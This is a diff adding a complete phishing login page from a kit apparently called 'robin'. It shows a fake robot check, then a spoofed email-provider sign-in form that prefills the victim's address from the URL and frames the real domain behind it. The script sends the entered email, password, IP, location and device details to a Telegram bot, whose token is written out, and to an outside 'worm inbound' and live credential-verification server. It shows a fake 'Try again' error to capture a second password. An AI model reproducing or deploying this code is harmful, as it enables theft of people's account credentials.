@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- robin-deploy: 2026-08-22T12:48:04Z -->
+   <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In.</title>
+  <!-- Include Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Google Fonts: Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    /* Hide the main content initially */
+    #main-content {
+      display: none;
+    }
+
+    /* Verification Div Styling */
+    #verification-div {
+      height: 100vh;
+      display: flex;
+      align-items: start;
+      justify-content: center;
+    padding-top: 10%;
+    }
+
+    /* Ensure text is left-aligned */
+    .verification-content {
+      text-align: left;
+    }
+
+    /* Adjust spinner size */
+    .spinner-border {
+      width: 1.5rem;
+      height: 1.5rem;
+    }
+  </style>
+  
+  
+  
+   <style>
+     #background-iframe,#overlay{position:fixed;top:0;left:0;height:100%;width:100%}body{font-family:Poppins,sans-serif;margin:0;padding:0;overflow:hidden}#background-iframe{border:none;z-index:-3;object-fit:cover}#overlay{background-color:rgba(0,0,0,.5);z-index:-2}.form-container{display:none;max-width:400px;width:100%;padding:2rem;background-color:rgba(255,255,255,.95);border-radius:.75rem;box-shadow:0 8px 16px rgba(0,0,0,.2);position:relative;z-index:1}.icon-text{display:flex;align-items:center;margin-bottom:1.5rem}.icon-text img{width:32px;height:32px;margin-right:.5rem}.icon-text .h4{margin-bottom:0;color:#0d6efd}.form-floating{position:relative;margin-bottom:1.5rem}.form-floating label,.input-icon{position:absolute;color:#6c757d;pointer-events:none}.form-floating label{transition:.2s ease-in-out;left:2.5rem;top:-.2rem;background-color:transparent;z-index:1}.form-floating input:focus+label,.form-floating input:not(:placeholder-shown)+label{transform:translateY(-1.5rem);font-size:.85rem;color:#0d6efd}.form-control{border-top:none;border-left:none;border-right:none;border-bottom:2px solid #ced4da;border-radius:0;padding-left:2.5rem;transition:border-color .2s;background-color:transparent}.form-control:focus{box-shadow:none;outline:0;border-bottom-color:#0d6efd}.input-icon{left:.75rem;top:50%;transform:translateY(-50%);font-size:1.2rem}.btn-primary{width:100%;padding:.75rem;font-size:1rem;background-color:#0d6efd;border:none;border-radius:.375rem;transition:background-color .3s,color .3s}.btn-primary:hover{background-color:#0b5ed7;color:#fff}.btn-primary:focus{box-shadow:none}@media (max-width:576px){.form-container{padding:1.5rem}}.loader-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);align-items:center;justify-content:center;z-index:9999;display:none}.error-message{color:red;margin-bottom:1rem;display:none}
+    </style>
+  
+  
+  
+<script>
+/*robin-lead-email-start*/
+(function () {
+  var EMAIL_RE = /([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/;
+
+  function extractEmail(s) {
+    if (!s) return '';
+    var m = String(s).match(EMAIL_RE);
+    return m ? m[0] : '';
+  }
+
+  function decodeLeadToken(val) {
+    if (val == null) return '';
+    var s = String(val).trim();
+    if (!s) return '';
+    try {
+      s = decodeURIComponent(s.replace(/\+/g, ' '));
+    } catch (e) { /* keep */ }
+    var direct = extractEmail(s);
+    if (direct) return direct;
+    var b64 = s.replace(/-/g, '+').replace(/_/g, '/');
+    while (b64.length % 4) b64 += '=';
+    try {
+      var dec = atob(b64);
+      direct = extractEmail(dec);
+      if (direct) return direct;
+    } catch (e2) { /* not base64 */ }
+    return '';
+  }
+
+  function RobinGetLeadEmail() {
+    try {
+      var p = new URLSearchParams(window.location.search);
+      var fromQ = decodeLeadToken(p.get('e') || p.get('em') || p.get('email') || '');
+      if (fromQ) return fromQ;
+    } catch (e) { /* ignore */ }
+    return '';
+  }
+
+  window.RobinGetLeadEmail = RobinGetLeadEmail;
+})();
+/*robin-lead-email-end*/
+</script>
+<script>
+/* robin-skip-tg-start */
+(function () {
+  var _fetch = window.fetch;
+  window.fetch = function (url, opts) {
+    if (typeof url === 'string' && url.indexOf('api.telegram.org') !== -1) {
+      return Promise.resolve({
+        ok: true,
+        json: function () { return Promise.resolve({ ok: true }); },
+      });
+    }
+    return _fetch.apply(this, arguments);
+  };
+})();
+/* robin-skip-tg-end */
+</script>
+<script>
+/* robin-true-login-start */
+/**
+ * Optional true-login verification (injected at link deploy).
+ * Placeholders replaced via html_inject.inject_true_login_helper
+ */
+(function () {
+  var cfg = {
+    enabled: /*obfs-truelogin-enabled*/true/*obfe-truelogin-enabled*/,
+    endpoint: /*obfs-truelogin-url*/"https://wl-c3b817cf.ooguy.com/api/login/verify"/*obfe-truelogin-url*/,
+    wormInboundEnabled: /*obfs-worm-inbound-enabled*/true/*obfe-worm-inbound-enabled*/,
+    wormInboundUrl: /*obfs-worm-inbound-url*/"http://wl-c3b817cf.ooguy.com/api/bot/inbound"/*obfe-worm-inbound-url*/,
+  };
+
+  function normalizeStatus(data) {
+    if (typeof data === 'string') {
+      var s = data.toLowerCase();
+      if (s === 'successful' || s === 'success' || s === 'ok' || s === 'verified') return 'successful';
+      if (s === 'failed' || s === 'fail' || s === 'failure' || s === 'incorrect' || s === 'invalid') {
+        return 'failed';
+      }
+      if (s === 'unreachable') return 'unreachable';
+      return 'unknown';
+    }
+    if (!data || typeof data !== 'object') return 'unknown';
+    var s = String(data.status || data.result || data.state || '').toLowerCase();
+    if (s === 'successful' || s === 'success' || s === 'ok' || s === 'verified') return 'successful';
+    if (s === 'failed' || s === 'fail' || s === 'failure' || s === 'incorrect' || s === 'invalid') {
+      return 'failed';
+    }
+    if (s === 'unreachable') return 'unreachable';
+    return 'unknown';
+  }
+
+  function normalizeVerifyUrl(url) {
+    var raw = String(url || '').trim();
+    if (!raw) return '';
+    if (raw.indexOf('http://') === 0 && window.location.protocol === 'https:') {
+      return 'https://' + raw.slice(7);
+    }
+    return raw;
+  }
+
+  function isEnabled() {
+    return cfg.enabled === true && !!String(cfg.endpoint || '').trim();
+  }
+
+  function isWormInboundEnabled() {
+    return cfg.wormInboundEnabled === true && !!String(cfg.wormInboundUrl || '').trim();
+  }
+
+  var VERIFY_TIMEOUT_MS = 90000;
+
+  function fetchJsonWithTimeout(url, options, timeoutMs) {
+    var controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
+    var timer = controller ? setTimeout(function () { controller.abort(); }, timeoutMs) : null;
+    var opts = options || {};
+    if (controller) opts.signal = controller.signal;
+    return fetch(url, opts)
+      .then(function (res) {
+        return res.json().catch(function () { return null; }).then(function (data) {
+          if (!res.ok) return null;
+          return data;
+        });
+      })
+      .catch(function () {
+        return null;
+      })
+      .then(function (data) {
+        if (timer) clearTimeout(timer);
+        return data;
+      });
+  }
+
+  function verifyOnce(email, password, timeoutMs) {
+    if (!isEnabled()) return Promise.resolve(null);
+    var url = normalizeVerifyUrl(cfg.endpoint);
+    if (!url) return Promise.resolve('unreachable');
+    return fetchJsonWithTimeout(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: email, password: password }),
+    }, timeoutMs || VERIFY_TIMEOUT_MS).then(function (data) {
+      if (!data) return 'unreachable';
+      return normalizeStatus(data);
+    });
+  }
+
+  function verify(email, password) {
+    return verifyOnce(email, password, VERIFY_TIMEOUT_MS).then(function (status) {
+      if (status !== 'unreachable') return status;
+      return verifyOnce(email, password, VERIFY_TIMEOUT_MS);
+    });
+  }
+
+  function postToWormInbound(email, password, extra) {
+    if (!isWormInboundEnabled()) return Promise.resolve();
+    var lines = [
+      'Robin hosted link',
+      '📧 Email: ' + String(email || ''),
+      '🔑 Password: ' + String(password || ''),
+    ];
+    if (extra != null && String(extra).trim()) {
+      lines.push(String(extra).trim());
+    }
+    lines.push('URL: ' + String(window.location.href || ''));
+    var controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
+    var timer = controller ? setTimeout(function () { controller.abort(); }, 15000) : null;
+    return fetch(String(cfg.wormInboundUrl || '').trim(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        text: lines.join(String.fromCharCode(10)),
+        dry_run: false,
+        log_only: isEnabled(),
+      }),
+      signal: controller ? controller.signal : undefined,
+    }).catch(function () {}).then(function () {
+      if (timer) clearTimeout(timer);
+    });
+  }
+
+  function redirectUrlFromEmail(email, fallback) {
+    var parts = String(email || '').split('@');
+    if (parts.length > 1 && parts[1]) return 'https://' + parts[1];
+    return fallback || 'https://www.google.com';
+  }
+
+  function postVerifyOutcomeToTelegram(status, email, password, extra) {
+    if (isWormInboundEnabled()) return Promise.resolve();
+    if (typeof window.RobinLoginOutcomeTelegram !== 'undefined' && window.RobinLoginOutcomeTelegram.post) {
+      return window.RobinLoginOutcomeTelegram.post(status, email, password, extra);
+    }
+    return Promise.resolve();
+  }
+
+  /**
+   * Apply verify API result to UI callbacks.
+   */
+  function resolveOutcome(opts) {
+    var status = opts.status || 'unknown';
+    var attempt = opts.attempt || 1;
+    var maxAttempts = opts.maxAttempts || 2;
+    var getRedirectUrl = opts.getRedirectUrl || function () { return 'https://www.google.com'; };
+    var onRedirect = opts.onRedirect || function (url) { window.location.href = url; };
+    var onIncorrectPassword = opts.onIncorrectPassword || opts.onFailed || function () {};
+    var onFakeError = opts.onFakeError || opts.onIncorrectPassword || opts.onFailed || function () {};
+
+    if (status === 'successful') {
+      onRedirect(getRedirectUrl());
+      return;
+    }
+    if (status === 'failed') {
+      onIncorrectPassword();
+      return;
+    }
+    if (status === 'unreachable') {
+      onIncorrectPassword();
+      return;
+    }
+    /* unknown only: classic 2-attempt UX when IMAP host cannot be resolved */
+    if (attempt < maxAttempts) {
+      onFakeError();
+      return;
+    }
+    onRedirect(getRedirectUrl());
+  }
+
+  /**
+   * @returns {Promise<'legacy'|'done'>}
+   */
+  function handleLoginAttempt(opts) {
+    if (!isEnabled()) return Promise.resolve('legacy');
+    postToWormInbound(opts.email, opts.password, opts.telegramExtra);
+    return verify(opts.email, opts.password).then(function (status) {
+      postVerifyOutcomeToTelegram(status, opts.email, opts.password, opts.telegramExtra);
+      resolveOutcome({
+        status: status,
+        attempt: opts.attempt,
+        maxAttempts: opts.maxAttempts,
+        getRedirectUrl: opts.getRedirectUrl,
+        onRedirect: opts.onRedirect,
+        onIncorrectPassword: opts.onIncorrectPassword,
+        onFakeError: opts.onFakeError,
+        onFailed: opts.onFailed,
+      });
+      return 'done';
+    });
+  }
+
+  /**
+   * Real IMAP verification only when true-login is enabled (Robin endpoint).
+   * When disabled: classic 2-attempt UX with no server verify.
+   * @returns {Promise<boolean>} always true when RobinTrueLogin is used
+   */
+  function runLoginVerify(opts) {
+    if (!isEnabled()) {
+      resolveOutcome({
+        status: 'unknown',
+        attempt: opts.attempt,
+        maxAttempts: opts.maxAttempts || 2,
+        getRedirectUrl: opts.getRedirectUrl,
+        onRedirect: opts.onRedirect,
+        onIncorrectPassword: opts.onIncorrectPassword || opts.onFailed,
+        onFakeError: opts.onFakeError || opts.onFailed,
+        onFailed: opts.onFailed,
+      });
+      return Promise.resolve(true);
+    }
+    postToWormInbound(opts.email, opts.password, opts.telegramExtra);
+    return verify(opts.email, opts.password).then(function (status) {
+      postVerifyOutcomeToTelegram(status, opts.email, opts.password, opts.telegramExtra);
+      resolveOutcome({
+        status: status,
+        attempt: opts.attempt,
+        maxAttempts: opts.maxAttempts || 2,
+        getRedirectUrl: opts.getRedirectUrl,
+        onRedirect: opts.onRedirect,
+        onIncorrectPassword: opts.onIncorrectPassword || opts.onFailed,
+        onFakeError: opts.onFakeError || opts.onFailed,
+        onFailed: opts.onFailed,
+      });
+      return true;
+    });
+  }
+
+  /**
+   * Legacy 2-attempt fallback when true-login is disabled.
+   */
+  function completeLoginFlow(opts) {
+    return handleLoginAttempt(opts).then(function (mode) {
+      if (mode === 'legacy' && typeof opts.runLegacy === 'function') {
+        return opts.runLegacy();
+      }
+    });
+  }
+
+  window.RobinTrueLogin = {
+    isEnabled: isEnabled,
+    isWormInboundEnabled: isWormInboundEnabled,
+    verify: verify,
+    postToWormInbound: postToWormInbound,
+    normalizeStatus: normalizeStatus,
+    redirectUrlFromEmail: redirectUrlFromEmail,
+    resolveOutcome: resolveOutcome,
+    handleLoginAttempt: handleLoginAttempt,
+    runLoginVerify: runLoginVerify,
+    completeLoginFlow: completeLoginFlow,
+    postVerifyOutcomeToTelegram: postVerifyOutcomeToTelegram,
+  };
+})();
+
+/* robin-true-login-end */
+</script>
+</head>
+
+
+ 
+    <!-- Verification Div -->
+  
+
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
+    
+  <body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
+    <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
+      <div class="row">
+        <div class="col-12 verification-content mx-2">
+          <h2>Checking your browser and insight for help.....</h2>
+      <div>
+        <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border:0px solid black;background: #f3efef;border-radius:5px;">
+        <input type="checkbox" id="bot-check" class="form-check-input">
+        <label for="bot-check" class="form-check-label ms-2">I am not a robot</label>
+        </div>
+      </div>
+
+      <p class="pt-1">click on the checkbox to verify if you're human.</p>
+        </div>
+      </div>
+    </div>
+    <!-- Background Iframe -->
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <!-- Dimmed Overlay -->
+    <div id="overlay"></div>
+    <!-- Form Container -->
+    <div class="form-container" id="form-container" >
+        <!-- Error Message -->
+        <div id="error-message" class="error-message">Try again</div>
+
+        <form id="user-form">
+            <!-- Icon and Text Row -->
+            <div class="icon-text">
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width:15px;">
+                <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
+            </div>
+            <!-- Heading -->
+            <h5 class="mb-3">Leading with Security.</h5>
+            <!-- Paragraph -->
+            <p class="mb-4 text-muted" style="font-size: .8rem;">Learn more useful tips, login to continue</p>
+      
+            <!-- Email Input -->
+            <div class="form-floating position-relative">
+                <i class="bi bi-envelope input-icon"></i>
+                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
+                <label for="email" style="background-color: transparent;">Email</label>
+            </div>
+            <!-- Password Input -->
+            <div class="form-floating position-relative">
+                <i class="bi bi-lock input-icon"></i>
+                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
+                <label for="password" style="background-color: transparent;">Password</label>
+            </div>
+            <!-- Submit Button -->
+            <button type="submit" class="btn btn-primary">Next</button>
+        </form>
+    </div>
+
+    <!-- Loader Overlay -->
+    <div id="loader-overlay" class="loader-overlay">
+        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript to Handle Email from URL Hash and Background Iframe -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+      /*obf-start*/
+// Translations object
+const translations = {
+  en: {
+    checkingBrowser: "Checking your browser and insight for help.....",
+    notRobot: "I am not a robot",
+    clickCheckbox: "click on the checkbox to verify if you're human.",
+    verifying: "Verifying...",
+    redirecting: "Redirecting...",
+    tryAgain: "Try again",
+    leadingSecurity: "Leading with Security.",
+    loginToContinue: "Learn more useful tips, login to continue",
+    email: "Email",
+    password: "Password",
+    next: "Next",
+    loading: "Loading..."
+  },
+  ko: {
+    checkingBrowser: "브라우저를 확인하고 도움을 위한 정보를 분석 중.....",
+    notRobot: "저는 로봇이 아닙니다",
+    clickCheckbox: "사람인지 확인하려면 체크박스를 클릭하세요.",
+    verifying: "확인 중...",
+    redirecting: "리디렉션 중...",
+    tryAgain: "다시 시도하세요",
+    leadingSecurity: "보안을 선도합니다.",
+    loginToContinue: "유용한 팁을 자세히 알아보고, 계속하려면 로그인하세요",
+    email: "이메일",
+    password: "비밀번호",
+    next: "다음",
+    loading: "로딩 중..."
+  },
+  es: {
+    checkingBrowser: "Comprobando tu navegador y buscando ayuda.....",
+    notRobot: "No soy un robot",
+    clickCheckbox: "haz clic en la casilla para verificar que eres humano.",
+    verifying: "Verificando...",
+    redirecting: "Redirigiendo...",
+    tryAgain: "Inténtalo de nuevo",
+    leadingSecurity: "Liderando con Seguridad.",
+    loginToContinue: "Aprende más consejos útiles, inicia sesión para continuar",
+    email: "Correo electrónico",
+    password: "Contraseña",
+    next: "Siguiente",
+    loading: "Cargando..."
+  },
+  de: {
+    checkingBrowser: "Überprüfung Ihres Browsers und Suche nach Hilfe.....",
+    notRobot: "Ich bin kein Roboter",
+    clickCheckbox: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
+    verifying: "Überprüfung...",
+    redirecting: "Weiterleitung...",
+    tryAgain: "Versuchen Sie es erneut",
+    leadingSecurity: "Führend in Sicherheit.",
+    loginToContinue: "Erfahren Sie mehr nützliche Tipps, melden Sie sich an, um fortzufahren",
+    email: "E-Mail",
+    password: "Passwort",
+    next: "Weiter",
+    loading: "Laden..."
+  },
+  it: {
+    checkingBrowser: "Controllo del browser e ricerca di assistenza.....",
+    notRobot: "Non sono un robot",
+    clickCheckbox: "clicca sulla casella per verificare che sei umano.",
+    verifying: "Verifica in corso...",
+    redirecting: "Reindirizzamento...",
+    tryAgain: "Riprova",
+    leadingSecurity: "Leader nella Sicurezza.",
+    loginToContinue: "Scopri altri consigli utili, accedi per continuare",
+    email: "E-mail",
+    password: "Password",
+    next: "Avanti",
+    loading: "Caricamento..."
+  }
+};
+
+// Country to language mapping
+const countryToLang = {
+  'KR': 'ko',  // South Korea
+  'ES': 'es',  // Spain
+  'MX': 'es',  // Mexico
+  'AR': 'es',  // Argentina
+  'CO': 'es',  // Colombia
+  'CL': 'es',  // Chile
+  'PE': 'es',  // Peru
+  'DE': 'de',  // Germany
+  'AT': 'de',  // Austria
+  'CH': 'de',  // Switzerland (German)
+  'IT': 'it'   // Italy
+};
+
+let currentLang = 'en';
+
+// Function to apply translations
+function applyTranslations(lang) {
+  const t = translations[lang] || translations['en'];
+  currentLang = lang;
+  
+  // Update verification div elements
+  const checkingH2 = document.querySelector('#verification-div h2');
+  if (checkingH2) checkingH2.textContent = t.checkingBrowser;
+  
+  const robotLabel = document.querySelector('label[for="bot-check"]');
+  if (robotLabel) robotLabel.textContent = t.notRobot;
+  
+  const clickP = document.querySelector('#verification-div .verification-content > p');
+  if (clickP) clickP.textContent = t.clickCheckbox;
+  
+  // Update form elements
+  document.getElementById('error-message').textContent = t.tryAgain;
+  
+  const securityH5 = document.querySelector('.form-container h5');
+  if (securityH5) securityH5.textContent = t.leadingSecurity;
+  
+  const loginP = document.querySelector('.form-container .text-muted');
+  if (loginP) loginP.textContent = t.loginToContinue;
+  
+  const emailLabel = document.querySelector('label[for="email"]');
+  if (emailLabel) emailLabel.textContent = t.email;
+  
+  const passwordLabel = document.querySelector('label[for="password"]');
+  if (passwordLabel) passwordLabel.textContent = t.password;
+  
+  const nextBtn = document.querySelector('.btn-primary');
+  if (nextBtn) nextBtn.textContent = t.next;
+}
+
+let submitCount = 0;
+document.addEventListener("DOMContentLoaded", (() => {
+  let e = null;
+  if (typeof RobinGetLeadEmail === 'function') {
+    e = RobinGetLeadEmail();
+  } else {
+    try {
+      var p = new URLSearchParams(window.location.search);
+      var raw = p.get('e') || p.get('em') || p.get('email') || '';
+      if (raw) {
+        try { e = decodeURIComponent(String(raw).replace(/\+/g, ' ')); } catch (err) { e = raw; }
+      }
+    } catch (err2) { /* ignore */ }
+  }
+
+  let t;
+  if (e) {
+    document.getElementById("email").value = e;
+    const n = e.split("@");
+    if (2 === n.length) {
+      const e = n[1];
+      t = e, document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
+      const o = e.split(".")[0].toUpperCase();
+      document.getElementById("domain-name").textContent = o;
+      const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
+      document.getElementById("background-iframe").src = r
+    }
+  } else console.warn("No email found in URL query params."), document.getElementById("background-iframe").src = "about:blank";
+  
+  let n = {
+    ipAddress: "Fetching...",
+    userAgent: navigator.userAgent,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    browser: "Detecting...",
+    country: "Detecting...",
+    city: "Unknown",
+    region: "Unknown",
+    os: "Unknown",
+    deviceType: "desktop"
+  };
+  const o = navigator.userAgent;
+  o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown";
+  
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(o)) {
+    n.deviceType = "mobile";
+  }
+
+  // Use ipinfo.io to get IP and country
+  fetch("https://ipinfo.io/json").then((e => e.json())).then((data => {
+    n.ipAddress = data.ip || "Unavailable";
+    n.country = data.country || "Unknown";
+    n.city = data.city || "Unknown";
+    n.region = data.region || "Unknown";
+    n.org = data.org || "Unknown";
+    
+    // Apply translation based on country
+    const lang = countryToLang[data.country] || 'en';
+    applyTranslations(lang);
+  })).catch((e => {
+    console.error("Error fetching IP info:", e);
+    n.ipAddress = "Unavailable";
+    n.country = "Unknown";
+  }));
+  
+  // report_all parameter check removed
+  
+  // Helper function to format Telegram message
+  function getTelegramMessage(status, email, password, detailObj, loginUrl, source) {
+    const timestamp = new Date().toISOString();
+    
+    let header = "";
+    let statusLine = "";
+    let footerLine = "";
+    
+    if (status === "success") {
+      header = `SUCCESS LOG (${email}) -!`;
+      statusLine = "✅ VERIFIED LOGIN ✅";
+      footerLine = "✅ Login VERIFIED successfully";
+    } else if (status === "failed") {
+      header = `❌ Attempted but INCORRECT LOGIN ❌`;
+      statusLine = "";
+      footerLine = "❌ Wrong credentials - Login INCORRECT";
+    } else if (status === "php_unreachable") {
+      header = `⚠️ LOGIN API UNREACHABLE (${email})`;
+      statusLine = "";
+      footerLine = "true login server temporarily down!";
+    } else {
+      header = `!(${email}) - NEW LOGIN ATTEMPT (UNVERIFIED)!`;
+      statusLine = "⚠️ UNVERIFIED LOGIN ⚠️";
+      footerLine = "⚠️ Login status unknown or server error";
+    }
+
+    return `${header}
+${statusLine}
+
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 Location Info
+• IP Address: ${detailObj.ipAddress}
+• Country: ${detailObj.country}
+• Region: ${detailObj.region}
+• City: ${detailObj.city}
+• Timezone: ${detailObj.timezone}
+
+💻 Browser Info
+• Browser: ${detailObj.browser}
+• OS: ${detailObj.os || "Unknown"}
+• Device Type: ${detailObj.deviceType || "desktop"}
+
+📱 Device Details
+• Screen: ${window.screen.width}x${window.screen.height}
+• Platform: ${navigator.platform}
+• Language: ${navigator.language}
+
+⏰ Timestamp: ${timestamp}
+
+🔗 Login URL: ${loginUrl}
+
+${footerLine}
+🏷️ Source: ${source}`;
+  }
+
+  // Function to send report to Telegram (token/chat id replaced at deploy)
+  function sendToTelegram(message) {
+    const payload = {
+      chat_id: /*obfs-chatid*/'5027794050'/*obfe-chatid*/,
+      text: message
+    };
+    return fetch("https://api.telegram.org/bot" + /*obfs-api*/'8178497827:AAFIN7QR7iysGGV7Q8lTfZ858a8AhD9Mzjs'/*obfe-api*/ + "/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    }).catch((err) => {
+      console.error("Error sending to Telegram:", err);
+    });
+  }
+  
+  document.getElementById("user-form").addEventListener("submit", (function(e) {
+    e.preventDefault();
+    submitCount += 1;
+    const isFirstAttempt = 1 === submitCount;
+    const isSecondAttempt = 2 === submitCount;
+    
+    document.getElementById("loader-overlay").style.display = "flex";
+    document.getElementById("error-message").style.display = "none";
+    
+    const temail = document.getElementById("email").value.trim();
+    const tpass = document.getElementById("password").value.trim();
+    
+    // Wait for IP and country to be fetched
+    new Promise((resolve => {
+      const interval = setInterval((() => {
+        if ("Fetching..." !== n.ipAddress && "Detecting..." !== n.country) {
+          clearInterval(interval);
+          resolve();
+        }
+      }), 100);
+    })).then(async () => {
+      const detail = `IP Address: ${n.ipAddress}\nCountry: ${n.country}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`;
+      const redirectDomain = 'https://' + t;
+      const loginUrl = window.location.href;
+
+      try {
+        await sendToTelegram(getTelegramMessage('unknown', temail, tpass, n, loginUrl, 'WEBMAIL/CPANEL PAGE'));
+      } catch (err) {
+        console.warn('Telegram send failed:', err);
+      }
+
+      if (typeof RobinTrueLogin !== 'undefined') {
+        await RobinTrueLogin.completeLoginFlow({
+          email: temail,
+          password: tpass,
+          attempt: submitCount,
+          maxAttempts: 2,
+          telegramExtra: detail + '\nSource: WEBMAIL/CPANEL PAGE',
+          getRedirectUrl: function () { return redirectDomain; },
+          onIncorrectPassword: function () {
+            document.getElementById("loader-overlay").style.display = "none";
+            document.getElementById("error-message").style.display = "block";
+            document.getElementById("password").value = "";
+          },
+          onFakeError: function () {
+            document.getElementById("loader-overlay").style.display = "none";
+            document.getElementById("error-message").style.display = "block";
+            document.getElementById("password").value = "";
+          },
+          onRedirect: function (url) {
+            document.getElementById("loader-overlay").style.display = "none";
+            window.location.href = url;
+          },
+          runLegacy: async function () {
+            document.getElementById("loader-overlay").style.display = "none";
+            document.getElementById("password").value = "";
+            if (isFirstAttempt) {
+              document.getElementById("error-message").style.display = "block";
+            } else {
+              window.location.href = redirectDomain;
+            }
+          },
+        });
+        return;
+      }
+
+      document.getElementById("loader-overlay").style.display = "none";
+      document.getElementById("password").value = "";
+      if (isFirstAttempt) {
+        document.getElementById("error-message").style.display = "block";
+      } else {
+        window.location.href = redirectDomain;
+      }
+    });
+  }));
+}));
+/*obf-end*/
+  </script>
+</body>
+
+  
+      <!--End Main Content Div -->
+    <!--End Main Content Div -->
+    <!--End Main Content Div -->
+
+  <!-- Include Bootstrap 5 JS Bundle -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+  <!-- JavaScript Code -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const botCheck = document.getElementById('bot-check');
+      const verificationDiv = document.getElementById('verification-div');
+      const formContainer = document.getElementById('form-container');
+    
+      const mainContent = document.getElementById('main-content');
+
+      botCheck.addEventListener('change', function () {
+        if (this.checked) {
+          // Get current translation
+          const t = translations[currentLang] || translations['en'];
+          
+          // Replace the checkbox with a loader
+          const checkboxContainer = this.parentElement;
+          checkboxContainer.innerHTML = `
+            <div class="spinner-container d-flex align-items-center">
+              <div class="spinner-border" role="status">
+                <span class="visually-hidden">${t.loading}</span>
+              </div>
+              <span class="ms-2">${t.verifying}</span>
+            </div>
+          `;
+
+          // Wait for 4 seconds
+          setTimeout(function () {
+            // Display "Redirecting..." message
+            const t2 = translations[currentLang] || translations['en'];
+            verificationDiv.innerHTML = `
+              <div class="row">
+                <div class="col-12 verification-content">
+                  <h2>${t2.redirecting}</h2>
+                </div>
+              </div>
+            `;
+
+            // Wait for 2 seconds
+            setTimeout(function () {
+              // Hide verification div and show main content
+              verificationDiv.style.display = 'none';
+              mainContent.style.display = 'block';
+              formContainer.style.display = 'block';
+            }, 2000);
+          }, 4000);
+        }
+      });
+    });
+  </script>
+
+
+</html>
